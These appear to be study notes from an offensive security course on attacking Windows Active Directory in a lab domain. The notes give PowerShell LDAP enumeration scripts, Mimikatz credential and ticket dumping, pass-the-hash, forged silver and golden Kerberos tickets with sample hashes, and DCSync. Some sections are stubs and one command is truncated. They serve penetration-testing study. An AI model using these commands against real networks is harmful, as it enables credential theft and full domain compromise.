# PWK PDF Highlights

## Enumeration

### Traditional Approach

```powershell
net user  # Enumerates all local accounts
net user /domain  # Enumerate all users in the domain
net user jeff_admin /domain  # Query specific user details (check groups)
net group /domain  # Enumerate all groups in the domain (identify nested groups)
```

### Modern Approach

Discover the hostname of the domain controller and the components of the DistinguishedName

```powershell
# Using PowerShell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

#### Script

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
Write-Host "------------------------"
}
```

### Resolving Nested Groups

#### List all groups in the domain

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.name
}
```

#### List members of a group

Specify a group to list members of after identifying a list of groups.

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

This is where we could find another group which would be a nested group within Secret\_Group.

To list the members of the nested group we would perform the same script updating the `name.$Searcher.filter="(name=Nested_Group)"`

### Currently Logged in Users

```powershell
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
Get-NetSession -ComputerName dc01
```

### Enumeration through SPNs

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
}
```

In the output we get a 'serviceprincipalname'. May suggest a webserver if HTTP is shown.

Attempt to resolve the webserver domain using nslookup

```powershell
nslookup CorpWebServer.corp.com
```

Returns an internal IP address which also happens to be the Domain Controller. We can navigate to the IP so find more information.sh

## Authentication

### NTLM Authentication

### Kerberos Authentication

### Cached Credential Storage and Retrieval

Stored in the Local Security Authority Subsystem Service (LSASS)

```powershell
# May need elevated privilges
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords  # dumps hashes for all logged on users current machine
# Grab hashes
```

```powershell
mimikatz.exe
privilege::debug
sekurlsa::tickets  # Check for kerberos tickets stored in memory
# Lookg for Ticket Granting Service and Ticket Granting Ticket
```

### Service Account Attacks

```powershell
# Using PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H
```

See other documented notes for remaining details.

### Low and Slow Password Guessing

```powershell
net accounts  # Check lockout threshhold and lockout observation window
```

See other documented notes for remaining details.

## Lateral Movement Techniques

### Pass the Hash

```bash
# From Kali
pth-winexe -U <user>%<NTLM Hash> <IP> <command>
pth-winexe -U offsec%<NTLM Hash> //10.11.0.22 cmd
```

### Overpass the Hash

See other documented notes for remaining details.

### Pass the Ticket

```powershell
whoami /user  # Grab the SID
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
mimikatz # kerberos::list
```

### Distributed Component Object Model

See other documented notes for remaining details.

## Persistence

### Golden Tickets

```powershell
# From a compromised machine
psexec.exe \\dc01 cmd.exe  # Failed attempt to laterally move (access denied)
# From the Domain Controller
mimikatz.exe
privilege::debug
lsadump::lsa /patch
# Identify krbtgt user and grab the NTLM Hash
# Back on compromised machine
mimikatz.exe
privilege::debug
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd
psexec.exe \\dc01 cmd.exe
```

### Domain Controller Synchronization

```powershell
mimikatz.exe
lsadump::dcsync /user:Administrator
```
